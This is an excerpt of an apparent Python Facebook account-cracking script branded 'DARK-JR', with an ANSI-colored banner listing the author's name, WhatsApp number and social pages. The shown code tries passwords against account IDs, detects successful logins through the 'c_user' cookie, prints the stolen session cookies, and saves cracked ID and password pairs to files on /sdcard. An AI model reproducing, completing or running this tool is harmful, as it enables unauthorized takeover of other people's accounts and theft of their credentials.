...
\033[1;32m║AUTHOR    : Md. Jahangir Alam  ║║ \x1b[1;91m┃╰━╯┣╮┃┃╰━━┫╰━╯┣╯┃┃╰╯\033[1;32m  ║

\033[1;32m║══════════════════════════════════║║  \x1b[1;93m┃╭╮╭╯┃┃┃╭━━┻━━╮┃╱┃┃\033[1;32m   ║

\033[1;32m║WHATSAPP  : +8801710290284       ║║  \x1b[1;91m┃┃┃╰┳╯╰┫┃╱╱╱╱╱┃┃╱┃┃\033[1;32m    ║

\033[1;32m║══════════════════════════════════║║  \x1b[1;93m╰╯╰━┻━━┻╯╱╱╱╱╱╰╯╱╰╯\033[1;32m   ║

\033[1;32m║GITHUB    : DARK-JR           ║║                         ║
...
\033[1;32m║FACEBOOK : Md. Jahangir Alam  ║ Md.Jahangir.Alam.DARK.JR

\033[1;32m║══════════════════════════════════════════════════════════║

\033[1;32m║FB PAGE :  DARK JR            ║ Dark-jr
...
def ud():
    ...
    if opt == '1':
        ...
        os.system('xdg-open https://youtube.com/@lofymusic69')
...
def FD():
    ...
    if opt == '1':
        ...
        os.system('xdg-open https://www.facebook.com/Md.Jahangir.Alam.DARK.JR')
    ...
    try:
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print('    \033[1;32m[DARK-JR-OK]  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')

                cek_apk(session,coki)

                open('/sdcard/DARK-JR ok.txt', 'a').write( cid+' | '+ps+'\n')
                ...
                print('    \33[1;30m[DARK-JR-CP] ' +cid+ ' | ' +ps+           '  \33[0;97m')

                open('/sdcard/DARK-JR-CP.txt', 'a').write( cid+' | '+ps+' \n')
        ...
        sys.stdout.write(' %s[DARK-JR] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
